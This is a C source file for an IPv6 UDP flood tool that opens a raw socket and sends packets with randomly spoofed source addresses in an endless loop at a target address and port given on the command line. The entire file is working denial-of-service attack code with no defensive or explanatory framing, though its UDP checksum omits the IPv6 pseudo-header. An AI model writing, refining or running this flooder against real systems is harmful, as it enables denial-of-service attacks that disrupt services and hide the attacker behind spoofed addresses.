#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include<netinet/udp.h>		
#include<netinet/ip6.h>	
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>
#include <math.h>
#include <time.h>

#define IP_LEN 40                    //max length of ipv6 address
char target_addr[IP_LEN] = "::1";    //default target ip   
unsigned int target_port = 443;      //default target port
unsigned int source_port = 1234;     //default source port

unsigned short calculate_checksum(unsigned short * paddress, int len);
void rand_addr(char *addr);   //creatse random ipv6 address
void udp_flood(int *s);       //send the spoofed packet

int main(int argc, char *argv[]){
	
	if(argc > 6){   //check for arguments
		printf("invalid arguments. options are:\n");
		printf("-t <address> -p <port>\n");
		exit(0);
	}
	if(argc != 1){
		int i = 1;
		while(i < argc){
			if(strcmp(argv[i],"-t") == 0 && argc >= 3 && i+1 < argc){
				i++;
				strncpy(target_addr,argv[i],IP_LEN);
				int len = strlen(target_addr);
				if(len < 3 || len > IP_LEN -1){
					printf("the ip address %s is invalid\n",target_addr);
					exit(0);
				}
			}
			else if(strcmp(argv[i],"-p") == 0 && argc >= 3 && i+1 < argc){
				i++;
				target_port = atoi(argv[i]);
			}
			else{
				printf("invalid arguments. options are:\n");
				printf("-t <address> -p <port>\n");
				exit(0);
			}
			i++;
		}
	}
	srand(time(NULL));   //set seed for rand_addr()
	int sock = -1;       //open a raw socket for flooding
	if ((sock = socket (AF_INET6, SOCK_RAW, IPPROTO_RAW)) == -1) {
		fprintf (stderr, "socket() failed with error: %s\n", strerror (sock));
		exit(0);
	}
	printf("flooding %s at port %d\n",target_addr,target_port);
	
	while(1){  //flood
		udp_flood(&sock);
	}
	exit(0);
}

void rand_addr(char* addr){   //creates a random ipv6 address
	int ip_comp[8];
	for(int i = 0; i < 8; i++){   //create in range numbers for the address
		ip_comp[i] = rand() % 65520;
	}
	for(int i = 0; i < 7; i++){   //convert comp from decimal int to heximal string
		char tmp[5];
		char dot[] = ":\0";
		sprintf(tmp, "%x", ip_comp[i]);
		strcat(addr,tmp);
		strcat(addr,dot);
	}
	char tmp2[5];
	sprintf(tmp2, "%x", ip_comp[7]);
	strcat(addr,tmp2);
}

void udp_flood(int *s){   //create and send the spoofed packet
	
	int sock = *s;
	struct sockaddr_in6 saddr_in;
	struct ip6_hdr iph;
	struct udphdr udph;
	int udplen = sizeof(struct udphdr);
	int iplen = sizeof(struct ip6_hdr);
	int status;   //status check for errors
	
	saddr_in.sin6_family = AF_INET6;
	saddr_in.sin6_port = 0; 
	saddr_in.sin6_flowinfo = 0;
	saddr_in.sin6_scope_id = 0;
	if ((status = inet_pton(AF_INET6, target_addr, &(saddr_in.sin6_addr))) != 1) {
		fprintf (stderr, "inet_pton() failed.\nError message: %s\n", strerror (status));
		exit(0);
	}
	
	iph.ip6_flow = htonl ((6 << 28) | (0 << 20) | 0);   //default 0 flow
	iph.ip6_plen = htons (udplen);
	iph.ip6_nxt = IPPROTO_UDP;
	iph.ip6_hops = 128;
	char addr[IP_LEN] = "\0";   //set random address
	rand_addr(addr);
	if ((status = inet_pton(AF_INET6, addr, &(iph.ip6_src))) != 1) {
		fprintf (stderr, "inet_pton() failed.\nError message: %s\n", strerror (status));
		exit(0);
	}

	if ((status = inet_pton(AF_INET6, target_addr, &(iph.ip6_dst))) != 1) {
		fprintf (stderr, "inet_pton() failed.\nError message: %s\n", strerror (status));
		exit(0);
	}

	udph.source = htons(source_port);
	udph.dest = htons(target_port);
	udph.len = htons(udplen);	
	udph.check = 0;
	
	char packet[iplen + udplen];
	memcpy(packet, &iph, iplen);
	memcpy(packet+iplen, &udph, udplen);
	udph.check = calculate_checksum((unsigned short *) (packet+iplen), udplen);
	//memcpy(packet, &iph, iplen);
	memcpy(packet+iplen, &udph, udplen);
	
	sendto (sock, packet, iplen + udplen, 0, (struct sockaddr *) &saddr_in, sizeof (saddr_in));
}

unsigned short calculate_checksum(unsigned short * paddress, int len){  
	int nleft = len;
	int sum = 0;
	unsigned short * w = paddress;
	unsigned short answer = 0;

	while (nleft > 1)
	{
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1)
	{
		*((unsigned char *)&answer) = *((unsigned char *)w);
		sum += answer;
	}

	
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);                
	answer = ~sum;                      

	return answer;
}
